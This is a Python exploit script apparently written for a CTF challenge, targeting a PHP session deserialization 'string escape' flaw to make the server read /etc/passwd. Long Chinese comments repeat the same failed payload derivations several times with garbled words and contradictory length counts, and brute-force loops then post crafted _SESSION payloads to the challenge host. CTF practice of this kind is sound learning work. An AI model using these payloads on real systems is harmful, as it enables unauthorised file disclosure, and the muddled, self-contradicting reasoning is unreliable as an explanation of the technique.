import requests
import time
import base64

URL = "http://1758168b-428f-477d-8721-ba388f391162.node5.buuoj.cn:81/"

session = requests.Session()

# 正确理解这道题

# 源码：
# $_SESSION["user"] = 'guest';
# $_SESSION['function'] = $function;
# extract($_POST);
# $_SESSION['img'] = base64_encode('guest_img.png');
# $serialize_info = filter(serialize($_SESSION));
# $userinfo = unserialize($serialize_info);
# file_get_contents(base64_decode($userinfo['img']));

# 关键理解：
# 1. extract($_POST) 可以覆盖 $_SESSION 的属性
# 2. 但 img 在 extract 之后赋值，无法直接覆盖
# 3. 我们需要利用反序列化逃逸来注入新的 img 属性

# 正确的利用方式：
# 利用键名收缩来逃逸

# 当键名包含过滤词时，filter会删除这些词
# 但序列化长度字段不变
# 反序列化时会读取错误的字符数

# 关键：PHP反序列化是按顺序解析的
# 如果长度字段和实际字符串不匹配，会读取后面更多的字符

# 正确的构造：
# POST _SESSION[flag]=;s:3:"img";s:20:"xxx";}

# 键名 "flag" 长度4，filter后变成空
# 值 ";s:3:"img";s:20:"xxx";}" 镀度27

# 序列化：s:4:"flag";s:27:";s:3:"img";s:20:"xxx";}";
# filter后：s:4:"";s:27:";s:3:"img";s:20:"xxx";}";

# 键名长度4，实际空
# 读取后面4个字符作为键名："inje"（从inject的开头）

# 等等，inject的开头是 ";s:3:"img"...
# 所以读取4个字符 = ";s:3"

# 键名 = ";s:3"

# 然后读取值...
# 值长度27，实际字符串是 ":"img";s:20:"xxx";}"
# 这不是有效的格式...

# 问题：反序列化格式被破坏了

# 正确的方法：
# 我们需要让收缩后的字符串能够正确解析

# 关键：让键名收缩后，读取的字符正好能形成有效的键名

# 构造：
# POST _SESSION[flagflagflagflag]=;s:3:"img";s:20:"xxx";}

# 键名长度16，filter后变成空
# 读取后面16个字符作为键名

# 后面16个字符 = ";s:27:";s:3:"img"
# 键名 = ";s:27:";s:3:"img"

# 然后读取值...
# 值长度27，实际字符串是 ";s:20:"xxx";}"
# 这不是有效的格式...

# 问题：反序列化格式被破坏了

# 正确的方法：
# 我们需要让收缩后的字符串能够正确解析

# 关键：利用";}来关闭属性

# 构造：
# POST _SESSION[flagflagflagflag]=;s:3:"img";s:20:"xxx";}}

# 键名长度16，filter后变成空
# 值 ";s:3:"img";s:20:"xxx";}}" 镀度28

# 序列化：s:16:"flagflagflagflag";s:28:";s:3:"img";s:20:"xxx";}}";
# filter后：s:16:"";s:28:";s:3:"img";s:20:"xxx";}}";

# 键名长度16，实际空
# 读取后面16个字符作为键名

# 后面16个字符 = ";s:28:";s:3:"img"
# 键名 = ";s:28:";s:3:"img"

# 焉后读取值...
# 值长度28，实际字符串是 ";s:20:"xxx";}}"
# 这不是有效的格式...

# 还是失败！

# 让我换一种思路
# 利用值收缩来逃逸

# POST _SESSION[user]=flagflagflagflag";s:3:"img";s:20:"xxx";}

# 值 = "flagflagflagflag";s:3:"img";s:20:"xxx";}"
# filter后值 = ";s:3:"img";s:20:"xxx";}"

# 收缩 = 16 字节

# 序列化：s:4:"user";s:49:"flagflagflagflag";s:3:"img";s:20:"xxx";}";
# filter后：s:4:"user";s:49:";s:3:"img";s:20:"xxx";}";

# 反序列化时读取49个字符作为user的值
# 实际字符串是 ";s:3:"img";s:20:"xxx";}" (33字符)
# 会继续读取后面的内容

# 后面的内容是 ";s:8:"function";s:11:"show_image";s:3:"img";s:16:"Z3Vlc3RfaW1nLnBuZw==";}"

# 反序列化会读取 49 - 33 = 16 个字符
# 即 ";s:8:"function"

# user值 = ";s:3:"img";s:20:"xxx";}";s:8:"function"

# 然后继续解析...
# 下一个键名是 ";s:11:"show_image"
# 这不是有效的键名格式...

# 问题：反序列化格式被破坏了

# 正确的方法：
# 我们需要让收缩后的字符串能够正确解析

# 关键：利用";}来关闭属性

# 构造：
# POST _SESSION[user]=flagflagflagflag";s:3:"img";s:20:"xxx";}}

# 值 = "flagflagflagflag";s:3:"img";s:20:"xxx";}}"
# filter后值 = ";s:3:"img";s:20:"xxx";}}"

# 收缩 = 16 字节

# 序列化：s:4:"user";s:50:"flagflagflagflag";s:3:"img";s:20:"xxx";}}";
# filter后：s:4:"user";s:50:";s:3:"img";s:20:"xxx";}}";

# 反序列化时读取50个字符作为user的值
# 实际字符串是 ";s:3:"img";s:20:"xxx";}}" (34字符)
# 会继续读取后面的内容

# 后面的内容是 ";s:8:"function";s:11:"show_image";s:3:"img";s:16:"Z3Vlc3RfaW1nLnBuZw==";}"

# 反序列化会读取 50 - 34 = 16 个字符
# 即 ";s:8:"function"

# user值 = ";s:3:"img";s:20:"xxx";}}";s:8:"function"

# 然后继续解析...
# 下一个键名是 ";s:11:"show_image"
# 这不是有效的键名格式...

# 还是失败！

# 让我重新理解
# 关键：反序列化是按顺序解析的
# 我们需要让收缩后的字符串能够正确解析

# 正确的方法：
# 利用键名收缩来"吃掉"后面的值
# 然后注入我们想要的属性

# 构造：
# POST _SESSION[flagflagflagflag]=;s:3:"img";s:20:"xxx";}

# 键名长度16，filter后变成空
# 值 ";s:3:"img";s:20:"xxx";}" 镀度27

# 序列化：s:16:"flagflagflagflag";s:27:";s:3:"img";s:20:"xxx";}";
# filter后：s:16:"";s:27:";s:3:"img";s:20:"xxx";}";

# 键名长度16，实际空
# 读取后面16个字符作为键名

# 后面16个字符 = ";s:27:";s:3:"img"
# 键名 = ";s:27:";s:3:"img"

# 然后读取值...
# 值长度27，实际字符串是 ";s:20:"xxx";}"
# 这不是有效的格式...

# 问题：反序列化格式被破坏了

# 正确的方法：
# 我们需要让收缩后的字符串能够正确解析

# 关键：让键名收缩后，读取的字符正好能形成有效的键名

# 构造：
# POST _SESSION[flagflagflagflagflagflagflagflag]=;s:3:"img";s:20:"xxx";}

# 键名长度32，filter后变成空
# 读取后面32个字符作为键名

# 后面32个字符 = ";s:27:";s:3:"img";s:20:"xxx";}"
# 这正好32字符！

# 键名 = ";s:27:";s:3:"img";s:20:"xxx";}"

# 然后读取值...
# 值长度27，实际字符串是 ";s:3:"img";s:16:"Z3Vlc3RfaW1nLnBuZw==";}" 的开头

# 这不对...

# 让我重新理解
# 序列化格式：KEY;VALUE;
# KEY = s:LEN:"NAME";
# VALUE = s:LEN:"DATA";

# 如果键名收缩后，读取的字符正好是 ";s:27:";s:3:"img";s:20:"xxx";}"
# 这不是一个有效的键名格式...

# 正确的键名格式应该是 s:LEN:"NAME";
# 但 ";s:27:";s:3:"img";s:20:"xxx";}" 不是这个格式

# 让我换一种思路
# 利用值收缩来逃逸

# POST _SESSION[flag]=flagflagflagflag";s:3:"img";s:20:"xxx";}

# 键名 "flag" 收缩4字节
# 值 "flagflagflagflag";s:3:"img";s:20:"xxx";}" 收缩16字节

# 总收缩 = 20 字节

# 序列化：s:4:"flag";s:49:"flagflagflagflag";s:3:"img";s:20:"xxx";}";
# filter后：s:4:"";s:49:";s:3:"img";s:20:"xxx";}";

# 键名长度4，实际空
# 读取后面4个字符作为键名："inje"（从inject的开头）

# 等等，inject的开头是 ";s:3:"img"...
# 所以读取4个字符 = ";s:3"

# 键名 = ";s:3"

# 然后读取值...
# 值长度49，实际字符串是 ":"img";s:20:"xxx";}"
# 这不是有效的格式...

# 问题：反序列化格式被破坏了

# 正确的方法：
# 我们需要让收缩后的字符串能够正确解析

# 关键：利用";}来关闭属性

# 让我换一种构造
# POST _SESSION[flag]=flagflagflagflag";s:3:"img";s:20:"xxx";}s:8:"function";s:11:"show_image";s:3:"img";s:16:"Z3Vlc3RfaW1nLnBuZw==";}

# 这太长了...

# 让我直接测试
print("=== 测试正确的payload ===")

target = "/etc/passwd"
target_b64 = base64.b64encode(target.encode()).decode()

# 测试1：利用键名收缩
print("\n=== 测试键名收缩 ===")
inject = ';s:3:"img";s:20:"' + target_b64 + '";}'
for n in range(1, 30):
    key = "flag" * n
    data = {f"_SESSION[{key}]": inject}
    r = session.post(URL + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text and len(r.text) > 50:
        print(f"n={n}: {r.text[:200]}")
        if "root" in r.text:
            print("SUCCESS!")
            break

# 测试2：利用值收缩
print("\n=== 测试值收缩 ===")
inject = '";s:3:"img";s:20:"' + target_b64 + '";}'
for n in range(1, 30):
    value = "flag" * n + inject
    data = {"_SESSION[flag]": value}
    r = session.post(URL + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text and len(r.text) > 50:
        print(f"n={n}: {r.text[:200]}")
        if "root" in r.text:
            print("SUCCESS!")
            break

# 测试3：利用user值收缩
print("\n=== 测试user值收缩 ===")
for n in range(1, 30):
    value = "flag" * n + inject
    data = {"_SESSION[user]": value}
    r = session.post(URL + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text and len(r.text) > 50:
        print(f"n={n}: {r.text[:200]}")
        if "root" in r.text:
            print("SUCCESS!")
            break

# 测试4：利用php值收缩
print("\n=== 测试php值收缩 ===")
for n in range(1, 30):
    value = "php" * n + inject
    data = {"_SESSION[user]": value}
    r = session.post(URL + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text and len(r.text) > 50:
        print(f"n={n}: {r.text[:200]}")
        if "root" in r.text:
            print("SUCCESS!")
            break

# 测试5：利用php5值收缩
print("\n=== 测试php5值收缩 ===")
for n in range(1, 30):
    value = "php5" * n + inject
    data = {"_SESSION[user]": value}
    r = session.post(URL + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text and len(r.text) > 50:
        print(f"n={n}: {r.text[:200]}")
        if "root" in r.text:
            print("SUCCESS!")
            break

# 测试6：利用fl1g值收缩
print("\n=== 测试fl1g值收缩 ===")
for n in range(1, 30):
    value = "fl1g" * n + inject
    data = {"_SESSION[user]": value}
    r = session.post(URL + "?f=show_image", data=data)
    time.sleep(0.3)
    if r.text and len(r.text) > 50:
        print(f"n={n}: {r.text[:200]}")
        if "root" in r.text:
            print("SUCCESS!")
            break

